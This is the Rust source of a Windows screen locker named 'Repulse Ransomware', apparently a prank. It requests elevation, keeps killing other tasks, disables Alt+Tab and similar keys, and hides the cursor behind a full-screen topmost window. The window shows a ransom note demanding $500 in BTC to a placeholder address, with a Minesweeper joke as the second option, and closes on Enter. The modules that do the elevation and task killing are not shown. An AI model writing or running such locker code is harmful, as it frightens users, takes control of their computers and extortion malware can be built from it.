#![windows_subsystem = "windows"]
#![feature(atomic_mut_ptr)]

mod common;
mod elevate;
mod keyboard;
mod tasks;

use crate::common::encode_wide_string;
use crate::common::pack_rgb;

use winapi::{
    shared::{
        minwindef::{DWORD, HINSTANCE, LPARAM, LPVOID, LRESULT, UINT, WPARAM},
        ntdef::LPCWSTR,
        windef::{HCURSOR, HICON, HMENU, HWND, RECT},
    },
    um::{
        wingdi::{
            CreateFontW, CreateSolidBrush, DeleteObject, SelectObject, SetBkColor, SetTextColor,
            ANTIALIASED_QUALITY, CLIP_DEFAULT_PRECIS, DEFAULT_CHARSET, FW_REGULAR,
            OUT_DEFAULT_PRECIS, VARIABLE_PITCH,
        },
        winuser::{
            BeginPaint, CreateWindowExW, DefWindowProcW, DispatchMessageA, DrawTextExW, EndPaint,
            GetMessageA, PostQuitMessage, RegisterClassW, SetActiveWindow, SetCursor, SetWindowPos,
            ShowWindow, TranslateMessage, DT_NOCLIP, HWND_TOP, LPDRAWTEXTPARAMS, MSG, PAINTSTRUCT,
            SWP_NOMOVE, SWP_NOSIZE, SW_SHOW, VK_RETURN, WM_ACTIVATE, WM_DESTROY, WM_KEYDOWN,
            WM_KEYUP, WM_PAINT, WM_SYSKEYDOWN, WM_SYSKEYUP, WNDCLASSW, WS_EX_TOPMOST, WS_MAXIMIZE,
            WS_POPUP, WS_VISIBLE,
        },
    },
};

fn main() {
    elevate::ensure_elevated();

    // Continuously kill windows tasks in the background
    tasks::spawn_serial_taskkillers();

    // Disable task keys like Alt+Tab
    keyboard::disable_task_keys();

    /* Create popup window */

    unsafe {
        /* Register the window class */

        let window_class_name = encode_wide_string("Repulse_MainWindow");

        // TODO: DeleteObject (https://learn.microsoft.com/en-us/windows/win32/api/wingdi/nf-wingdi-createsolidbrush#remarks)
        let background_brush = CreateSolidBrush(pack_rgb(240, 40, 40));

        let window_class = WNDCLASSW {
            style: 0,
            lpfnWndProc: Some(window_proc),
            cbClsExtra: 0,
            cbWndExtra: 0,
            hInstance: 0 as HINSTANCE,
            hIcon: 0 as HICON,
            hCursor: 0 as HICON,
            hbrBackground: background_brush,
            lpszMenuName: 0 as LPCWSTR,
            lpszClassName: window_class_name.as_ptr(),
        };

        let error_code = RegisterClassW(&window_class);

        assert!(error_code != 0, "failed to register the window class");

        /* Create window */

        let window_title = encode_wide_string("Repulse Ransomware");

        let h_wnd = CreateWindowExW(
            WS_EX_TOPMOST,
            window_class_name.as_ptr(),
            window_title.as_ptr(),
            WS_MAXIMIZE | WS_POPUP | WS_VISIBLE,
            0, // x
            0, // y
            0, // width
            0, // height
            0 as HWND,
            0 as HMENU,
            0 as HINSTANCE,
            std::ptr::null_mut(),
        );

        assert!(h_wnd != (0 as HWND), "failed to open the window");

        /* Show the window */

        ShowWindow(h_wnd, SW_SHOW);

        /* Create the window message loop */

        // Create an empty message struct
        let mut msg: MSG = std::mem::zeroed();

        // Window Message Loop
        while GetMessageA(&mut msg, 0 as HWND, 0, 0) > 0 {
            TranslateMessage(&msg);
            DispatchMessageA(&msg);
        }
    }

    /* Cleanup activities */

    keyboard::enable_task_keys();

    tasks::despawn_serial_taskkillers();
}

unsafe extern "system" fn window_proc(
    h_wnd: HWND,
    msg: UINT,
    w_param: WPARAM,
    l_param: LPARAM,
) -> LRESULT {
    /* Bring window to front */

    ShowWindow(h_wnd, SW_SHOW);
    SetWindowPos(h_wnd, HWND_TOP, 0, 0, 400, 400, SWP_NOMOVE | SWP_NOSIZE);
    SetActiveWindow(h_wnd);

    /* Set the cursor to hidden */

    SetCursor(0 as HCURSOR);

    /* Handle Window Messages */

    match msg {
        WM_DESTROY => {
            PostQuitMessage(0);
        }
        WM_PAINT => {
            let mut ps: PAINTSTRUCT = std::mem::zeroed();
            let hdc = BeginPaint(h_wnd, &mut ps);

            SetBkColor(hdc, pack_rgb(240, 40, 40));
            SetTextColor(hdc, pack_rgb(240, 200, 200));

            let font_name = encode_wide_string("Segoe UI Semilight");
            const PADDING: i32 = 128;

            /* Draw `:(` title */

            let title_font = CreateFontW(
                256,
                0,
                0,
                0,
                FW_REGULAR,
                false as DWORD,
                false as DWORD,
                false as DWORD,
                DEFAULT_CHARSET,
                OUT_DEFAULT_PRECIS,
                CLIP_DEFAULT_PRECIS,
                ANTIALIASED_QUALITY,
                VARIABLE_PITCH,
                font_name.as_ptr(),
            );

            SelectObject(hdc, title_font as LPVOID);

            let mut text_rect = RECT {
                left: PADDING,
                top: PADDING,
                right: PADDING + 128,
                bottom: PADDING + 256,
            };

            DrawTextExW(
                hdc,
                encode_wide_string(":(").as_ptr(),
                -1,
                &mut text_rect,
                0,
                0 as LPDRAWTEXTPARAMS,
            );

            DeleteObject(title_font as LPVOID);

            /* Draw Subtitle */

            let subtitle_font = CreateFontW(
                36,
                0,
                0,
                0,
                FW_REGULAR,
                false as DWORD,
                false as DWORD,
                false as DWORD,
                DEFAULT_CHARSET,
                OUT_DEFAULT_PRECIS,
                CLIP_DEFAULT_PRECIS,
                ANTIALIASED_QUALITY,
                VARIABLE_PITCH,
                font_name.as_ptr(),
            );

            SelectObject(hdc, subtitle_font as LPVOID);

            let mut text_rect = RECT {
                left: PADDING,
                top: PADDING + 256,
                right: 0,
                bottom: 0,
            };

            DrawTextExW(
                hdc,
                encode_wide_string(
                    "Your PC has been compromised by Repulse Ransomware. Do NOT try to close this window or turn\r\n\
                    off your computer (Your files will not be recoverable). To reclaim your files, you have 2 options:\r\n\
                    \r\n\
                    1) Pay $500 in BTC to this address: 0x2345675434567543456567887654567\r\n\
                    2) Win Minesweeper on hard mode with no flags (1 attempt)",
                )
                .as_ptr(),
                -1,
                &mut text_rect,
                DT_NOCLIP,
                0 as LPDRAWTEXTPARAMS,
            );

            DeleteObject(subtitle_font as LPVOID);

            EndPaint(h_wnd, &mut ps);
        }
        WM_SYSKEYDOWN | WM_SYSKEYUP | WM_KEYUP => {}
        WM_KEYDOWN => {
            // Close on Enter Key
            if w_param as i32 == VK_RETURN {
                PostQuitMessage(0);
            }
        }
        WM_ACTIVATE => {}
        _ => return DefWindowProcW(h_wnd, msg, w_param, l_param),
    }

    0
}
